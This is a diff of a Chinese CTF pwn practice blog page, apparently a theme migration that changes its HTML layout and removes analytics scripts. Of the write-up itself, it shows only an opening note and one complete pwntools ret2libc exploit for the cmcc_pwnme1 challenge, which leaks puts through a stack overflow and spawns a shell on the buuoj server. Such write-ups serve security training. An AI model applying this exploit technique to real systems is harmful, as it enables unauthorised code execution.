@@ -1,153 +1,114 @@
-<!DOCTYPE HTML>
+<!DOCTYPE html>
 <html>
 <head>
   <meta charset="utf-8">
-  <meta http-equiv="pragma" content="no-cache">
-  <meta http-equiv="cache-control" content="no-cache">
-  <meta http-equiv="expires" content="0">
+  
+
   
   <title>buu每日一题（3） | winter - 像初雪一样自由洒落</title>
-  <meta name="author" content="winter">
-  
-  <meta name="description" content="0ctf_2017_babyheap
-单独写了篇文章，方法是fastbin attack
-
-
-0ctf_2017_babyheap详解
-
-wustctf2020_closed常用文件描述符
-stdin：0
-stdout：1
-stderr：2
-
-程序流程
-关闭了输出流和错误流，然后直接给了shell，">
-  
-  
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-
-  <meta property="og:title" content="buu每日一题（3）"/>
-  <meta property="og:site_name" content="winter - 像初雪一样自由洒落"/>
-
+  <meta name="description" content="0ctf_2017_babyheap 单独写了篇文章，方法是fastbin attack   0ctf_2017_babyheap详解  wustctf2020_closed常用文件描述符 stdin：0 stdout：1 stderr：2  程序流程 关闭了输出流和错误流，然后直接给了shell，但是没有输出。   方法： stdout重定向简单来说，既然stdout的文件描述符不可用，可以对s">
+<meta property="og:type" content="article">
+<meta property="og:title" content="buu每日一题（3）">
+<meta property="og:url" content="http://yoursite.com/2021/03/29/%C2%96buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%883%EF%BC%89/index.html">
+<meta property="og:site_name" content="winter - 像初雪一样自由洒落">
+<meta property="og:description" content="0ctf_2017_babyheap 单独写了篇文章，方法是fastbin attack   0ctf_2017_babyheap详解  wustctf2020_closed常用文件描述符 stdin：0 stdout：1 stderr：2  程序流程 关闭了输出流和错误流，然后直接给了shell，但是没有输出。   方法： stdout重定向简单来说，既然stdout的文件描述符不可用，可以对s">
+<meta property="og:image" content="http://yoursite.com/2021/03/29/%C2%96buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%883%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210430210044168.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/29/%C2%96buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%883%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210501162717088.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/29/%C2%96buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%883%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210501164740595.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/29/%C2%96buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%883%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210501164752604.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/29/%C2%96buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%883%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210419145953699.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/29/%C2%96buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%883%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210419150030225.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/29/%C2%96buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%883%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210501231211604.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/29/%C2%96buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%883%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210506151027760.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/29/%C2%96buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%883%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210506152600364.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/29/%C2%96buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%883%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210506154310332.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/29/%C2%96buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%883%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210506154404324.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/29/%C2%96buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%883%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210506155959849.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/29/%C2%96buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%883%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210506161229152.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/29/%C2%96buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%883%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210506161244074.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/29/%C2%96buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%883%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210506161308542.png">
+<meta property="article:published_time" content="2021-03-29T14:03:09.000Z">
+<meta property="article:modified_time" content="2021-05-07T16:02:49.947Z">
+<meta property="article:author" content="winter">
+<meta property="article:tag" content="buu刷题">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2021/03/29/%C2%96buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%883%EF%BC%89/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210430210044168.png">
   
-    <meta property="og:image" content=""/>
-  
-
+    <link rel="alternate" href="../../../../atom.xml" title="winter - 像初雪一样自由洒落" type="application/atom+xml">
   
   
-    <link href="/favicon.png" rel="icon">
+    <link rel="icon" href="/favicon.png">
   
   
-  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
-  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
-  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
-  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
-  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
-  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
-  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
-
-  <script src="/js/jquery-2.0.3.min.js"></script>
-
-  <!-- analytics -->
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
   
-<script>
-  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
-  ga('create', 'UA-70812759-1', 'auto');
-  ga('send', 'pageview');
-</script>
-
-
-
-<script>
-var _hmt = _hmt || [];
-(function() {
-  var hm = document.createElement("script");
-  hm.src = "//hm.baidu.com/hm.js?cb5448498d7169c668b07c2b255d62c1";
-  var s = document.getElementsByTagName("script")[0]; 
-  s.parentNode.insertBefore(hm, s);
-})();
-</script>
-
+  
+<link rel="stylesheet" href="../../../../css/style.css">
 
 <meta name="generator" content="Hexo 4.2.1"></head>
 
- <body>  
-  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
-    <div class="container">
-      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
-		<span class="sr-only">Toggle navigation</span>
-        <span class="icon-bar"></span>
-        <span class="icon-bar"></span>
-        <span class="icon-bar"></span>
-      </button>
-	  <a class="navbar-brand" href="/">winter - 像初雪一样自由洒落</a>
-      <div class="collapse navbar-collapse nav-menu">
-		<ul class="nav navbar-nav">
-		  
-		  <li>
-			<a href="/archives" title="All the articles.">
-			  <i class=""></i>Archives
-			</a>
-		  </li>
-		  
-		  <li>
-			<a href="/categories" title="All the categories.">
-			  <i class=""></i>Categories
-			</a>
-		  </li>
-		  
-		  <li>
-			<a href="/tags" title="All the tags.">
-			  <i class=""></i>Tags
-			</a>
-		  </li>
-		  
-		  <li>
-			<a href="/about" title="About me.">
-			  <i class=""></i>About
-			</a>
-		  </li>
-		  
-		  <li>
-			<a href="/atom.xml" title="Subscribe me.">
-			  <i class=""></i>RSS
-			</a>
-		  </li>
-		  
-		</ul>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="../../../../index.html" id="logo">winter - 像初雪一样自由洒落</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="../../../../index.html">Home</a>
+        
+          <a class="main-nav-link" href="../../../../archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="../../../../atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
       </div>
-    </div> <!-- container -->
-</nav>
-<div class="clearfix"></div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-buu每日一题（3）" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="" class="article-date">
+  <time datetime="2021-03-29T14:03:09.000Z" itemprop="datePublished">2021-03-29</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="../../../../categories/buu/">buu</a>
+  </div>
 
-  <div class="container">
-  	<div class="content">
-    	 
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      buu每日一题（3）
+    </h1>
+  
 
-
-	
-		<div class="page-header">
-			<h1> buu每日一题（3）</h1>
-		</div>
-	
-
-
-
-<div class="row post">
-	<!-- cols -->
-	
-	<div id="top_meta"></div>
-	<div class="col-md-9">
-	
-
-	<!-- content -->
-	<div class="mypage">		
-	  		
-
-	  <h2 id="0ctf-2017-babyheap"><a href="#0ctf-2017-babyheap" class="headerlink" title="0ctf_2017_babyheap"></a>0ctf_2017_babyheap</h2><blockquote>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="0ctf-2017-babyheap"><a href="#0ctf-2017-babyheap" class="headerlink" title="0ctf_2017_babyheap"></a>0ctf_2017_babyheap</h2><blockquote>
 <p>单独写了篇文章，方法是fastbin attack</p>
 </blockquote>
 <ul>
@@ -296,145 +257,154 @@ var _hmt = _hmt || [];
 </ol>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p=process("./pwnme1")</span></span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">25575</span>)</span><br><span class="line">elf=ELF(<span class="string">"./pwnme1"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.23-32.so"</span>)</span><br><span class="line"><span class="comment"># libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">get_fruit = <span class="number">0x08048624</span></span><br><span class="line"></span><br><span class="line">get_flag = <span class="number">0x08048677</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; 6. Exit    "</span>)</span><br><span class="line">p.sendline(str(<span class="number">5</span>))</span><br><span class="line">p.recvuntil(<span class="string">"fruit:"</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0xa4</span>+<span class="number">4</span>)+p32(puts_plt)+p32(get_fruit)+p32(puts_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">puts_addr = u32(p.recvuntil(<span class="string">"\xf7"</span>)[<span class="number">-4</span>:])</span><br><span class="line">log.success(hex(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">log.success(hex(system))</span><br><span class="line">log.success(hex(binsh))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"fruit:"</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0xa4</span>+<span class="number">4</span>)+p32(system)+p32(get_fruit)+p32(binsh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-	  
-	</div>
 
-	<div>
-  	<center>
-	<div class="pagination">
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2021/03/29/%C2%96buu%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%EF%BC%883%EF%BC%89/" data-id="cl03ieq6r002wssjn3cwwfqzp" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="../../../../tags/buu%E5%88%B7%E9%A2%98/" rel="tag">buu刷题</a></li></ul>
 
-    
-    
-    <a href="/2021/04/18/牛客网-算法篇/" type="button" class="btn btn-default"><i
-                class="fa fa-arrow-circle-o-left"></i> Prev</a>
-    
-
-    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
-    
-    <a href="/2021/03/19/团体程序设计天梯赛-练习集/" type="button" class="btn btn-default ">Next<i
-                class="fa fa-arrow-circle-o-right"></i></a>
-    
-
-    
-</div>
-
-    </center>
-	</div>
-	
-	<!-- comment -->
-	
-<section id="comment">
-    <h2 class="title">Comments</h2>
-
-    
-</section>
-
-
-	</div> <!-- col-md-9/col-md-12 -->
-		
-	
-	<div id="side_meta">
-		<div class="col-md-3" id="post_meta"> 
-
-	<!-- date -->
-	
-	<div class="meta-widget">
-	<i class="fa fa-clock-o"></i>
-	2021-03-29 
-	</div>
-	
-
-	<!-- categories -->
-    
-	<div class="meta-widget">
-	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
-    <ul id="categorys" class="tag_box list-unstyled collapse in">
-          
-  <li>
-    <li><a href="/categories/buu/">buu<span>13</span></a></li>
-  </li>
-
-    </ul>
-	</div>
-	
-
-	<!-- tags -->
-	
-	<div class="meta-widget">
-	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
-    <ul id="tags" class="tag_box list-unstyled collapse in">	  
-	    
-  <li><a href="/tags/buu刷题/">buu刷题<span>4</span></a></li>
-    </ul>
-	</div>
-		
-
-	<!-- toc -->
-	<div class="meta-widget">
-	
-	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
-	   <div id="toc" class="toc collapse in">
-		   <span class="toc-title">Contents</span>
-			<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0ctf-2017-babyheap"><span class="toc-article-text">0ctf_2017_babyheap</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#wustctf2020-closed"><span class="toc-article-text">wustctf2020_closed</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#常用文件描述符"><span class="toc-article-text">常用文件描述符</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#程序流程"><span class="toc-article-text">程序流程</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#stdout重定向"><span class="toc-article-text">stdout重定向</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#actf-2019-babystack"><span class="toc-article-text">actf_2019_babystack</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#actf-2019-babystack-1"><span class="toc-article-text">actf_2019_babystack</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#程序流程-1"><span class="toc-article-text">程序流程</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#完整exp"><span class="toc-article-text">完整exp</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#picoctf-2018-shellcode"><span class="toc-article-text">picoctf_2018_shellcode</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#难点"><span class="toc-article-text">难点</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#picoctf-2018-got-shell"><span class="toc-article-text">picoctf_2018_got_shell</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#程序流程-2"><span class="toc-article-text">程序流程</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#exp"><span class="toc-article-text">exp</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#mrctf2020-easy-equation"><span class="toc-article-text">mrctf2020_easy_equation</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#程序流程-3"><span class="toc-article-text">程序流程</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#漏洞利用"><span class="toc-article-text">漏洞利用</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#8不是9"><span class="toc-article-text">8不是9</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#exp-1"><span class="toc-article-text">exp</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#picoctf-2018-can-you-gets-me"><span class="toc-article-text">picoctf_2018_can_you_gets_me</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#完整exp-1"><span class="toc-article-text">完整exp</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#inndy-echo"><span class="toc-article-text">inndy_echo</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#程序流程-4"><span class="toc-article-text">程序流程</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#漏洞利用-1"><span class="toc-article-text">漏洞利用</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#完整exp-2"><span class="toc-article-text">完整exp</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#suctf-2018-basic-pwn"><span class="toc-article-text">suctf_2018_basic pwn</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#后门函数：-bin-cat"><span class="toc-article-text">后门函数：&#x2F;bin&#x2F;cat</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#完整exp-3"><span class="toc-article-text">完整exp</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#oneshot-tjctf-2016"><span class="toc-article-text">oneshot_tjctf_2016</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#完整exp-4"><span class="toc-article-text">完整exp</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#cmcc-pwnme1"><span class="toc-article-text">cmcc_pwnme1</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#常规做法"><span class="toc-article-text">常规做法</span></a></li></ol></li></ol>
-		</div>
-	
-	</div>
-	
-    <hr>
-	
-</div><!-- col-md-3 -->
-
-	</div>
-		
-
-</div><!-- row -->
-
-
-
-	</div>
+    </footer>
   </div>
-  <div class="container-narrow">
-  <footer> <p>
-  &copy; 2021 winter
   
-      with help from <a href="http://hexo.io/" target="_blank">Hexo</a>,<a href="http://github.com/wzpan/hexo-theme-freemind/" target="_blank" rel="noopener">Freemind</a>,<a href="http://getbootstrap.com/" target="_blank">Twitter Bootstrap</a> and <a href="http://getbootstrap.com/" target="_blank">BOOTSTRA.386</a>. 
-     <br> Theme by <a href="http://github.com/wzpan/hexo-theme-freemind/" target="_blank" rel="noopener">Freemind.386</a>.    
-</p>
- </footer>
-</div> <!-- container-narrow -->
+    
+<nav id="article-nav">
   
+    <a href="../../../04/18/%E7%89%9B%E5%AE%A2%E7%BD%91-%E7%AE%97%E6%B3%95%E7%AF%87/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          牛客网-算法篇
+        
+      </div>
+    </a>
+  
+  
+    <a href="../../19/%E5%9B%A2%E4%BD%93%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E5%A4%A9%E6%A2%AF%E8%B5%9B-%E7%BB%83%E4%B9%A0%E9%9B%86/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">团体程序设计天梯赛-练习集</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="../../../../categories/advanced-pwn/">advanced pwn</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/blockchain/">blockchain</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/book/">book</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/buu/">buu</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/chrome/">chrome</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/ida/">ida</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/iot/">iot</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/pwn/">pwn</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/reverse/">reverse</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/v8/">v8</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/%E4%B8%93%E9%A2%98/">专题</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/%E5%88%86%E4%BA%AB/">分享</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">基础知识</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/%E5%A4%8D%E7%8E%B0/">复现</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/%E5%B7%A5%E5%85%B7/">工具</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/%E5%B8%B8%E7%94%A8%E8%BD%AF%E4%BB%B6/">常用软件</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/%E6%80%BB%E7%BB%93/">总结</a></li><li class="category-list-item"><a class="category-list-link" href="../../../../categories/%E7%AE%97%E6%B3%95/">算法</a></li></ul>
+    </div>
+  </div>
 
 
   
-<a id="gotop" href="#">   
-  <span>⬆︎TOP</span>
-</a>
-
-<script src="/js/jquery.imagesloaded.min.js"></script>
-<script src="/js/gallery.js"></script>
-<script src="/js/bootstrap.min.js"></script>
-<script src="/js/main.js"></script>
-<script src="/js/search.js"></script> 
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/book/" rel="tag">book</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/buu%E5%88%B7%E9%A2%98/" rel="tag">buu刷题</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/c-%E5%9F%BA%E7%A1%80/" rel="tag">c++基础</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/ciscn/" rel="tag">ciscn</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/csapp/" rel="tag">csapp</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/dasctf/" rel="tag">dasctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/double-free/" rel="tag">double free</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/fastbin-attack/" rel="tag">fastbin attack</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/flair/" rel="tag">flair</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/fmt/" rel="tag">fmt</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/git/" rel="tag">git</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/googlectf-2020/" rel="tag">googlectf 2020</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/house-of-force/" rel="tag">house of force</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/house-of-orange/" rel="tag">house of orange</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/kernel-pwn/" rel="tag">kernel pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/leetcode/" rel="tag">leetcode</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/mips-pwn/" rel="tag">mips pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/off-by-one/" rel="tag">off by one</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/pwnable-tw/" rel="tag">pwnable.tw</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/srop/" rel="tag">srop</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/unlink/" rel="tag">unlink</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/unsortedbin-attack/" rel="tag">unsortedbin attack</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/v8/" rel="tag">v8</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/%E3%80%8A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E7%9B%B8%E8%BF%98%E5%8E%9F%E3%80%8B/" rel="tag">《操作系统真相还原》</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/%E4%BA%BA%E7%94%9F/" rel="tag">人生</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/%E5%87%BA%E9%A2%98%E7%8E%AF%E5%A2%83/" rel="tag">出题环境</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" rel="tag">基础知识</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/%E5%9F%BA%E7%A1%80%E7%BB%83%E4%B9%A0/" rel="tag">基础练习</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/%E5%A4%A9%E6%A2%AF%E8%B5%9B/" rel="tag">天梯赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="../../../../tags/%E5%AE%89%E8%A3%85/" rel="tag">安装</a></li><li 